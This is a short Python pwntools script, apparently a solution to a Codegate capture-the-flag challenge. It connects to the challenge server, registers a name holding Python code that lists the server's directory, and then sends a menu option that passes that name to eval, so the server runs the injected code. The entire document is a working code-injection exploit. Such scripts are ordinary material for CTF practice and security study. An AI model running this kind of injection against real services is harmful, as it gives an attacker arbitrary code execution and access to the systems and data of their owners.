from pwn import *

context.log_level = "debug"

p = remote("ch41l3ng3s.codegate.kr", 2014)

def init(name):
    p.readuntil("Name :")
    p.send(name+"\n")
    p.readuntil("###############################################")
def menu(opt):
    try:
        p.send(opt+"\n")
        return p.readuntil("###############################################")
    except EOFError:
        exit()

init("import os;print os.listdir('.')")
print menu("dig,eval(name)")

